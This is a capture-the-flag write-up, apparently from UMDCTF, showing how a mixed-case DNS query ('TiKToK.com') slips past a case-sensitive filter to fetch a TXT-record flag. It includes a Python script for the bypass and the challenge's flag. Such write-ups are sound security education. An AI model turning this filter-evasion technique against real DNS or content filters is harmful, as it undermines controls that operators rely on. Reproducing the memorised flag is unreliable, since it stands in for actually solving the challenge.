# TikTok Ban

## Challenge
> The government has implemented a DNS filter to block all access to TikTok! However, we've discovered the flag is hidden in a TXT record on tiktok.com's DNS. Can you find a way to bypass the filter and retrieve the flag?

## Files
- `filter.py` - Script blocking DNS requests for tiktok.com 

## Solution
The filter blocks DNS requests for tiktok.com by checking for the exact string `b'tiktok\x03com'`. However, DNS is case-insensitive while the filter is case-sensitive.

I bypassed the filter by changing the case to "TiKToK" in my DNS query:

```python
import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("challs.umdctf.io", 32300))

# Basic DNS header
transaction_id = b'\x00\x01'
flags = b'\x00\x00'
questions = b'\x00\x01'
answers = b'\x00\x00'
authority = b'\x00\x00'
additional = b'\x00\x00'

# Using TiKToK instead of tiktok to bypass filter
domain_parts = ['TiKToK', 'com']  
domain = b''
for part in domain_parts:
    domain += bytes([len(part)]) + part.encode()
domain += b'\x00'

# TXT record request
q_type = b'\x00\x10'
q_class = b'\x00\x01'

query = transaction_id + flags + questions + answers + authority + additional + domain + q_type + q_class

s.send(struct.pack('!I', len(query)) + query)
response = s.recv(1024)
print(response)
s.close()
```

## Flag
`UMDCTF{W31C0M3_84CK_4ND_7H4NK5_F0r_Y0Ur_P4713NC3_4ND_5UPP0r7_45_4_r35U17_0F_Pr351D3N7_7rUMP_71K70K_15_84CK_1N_7H3_U5}` 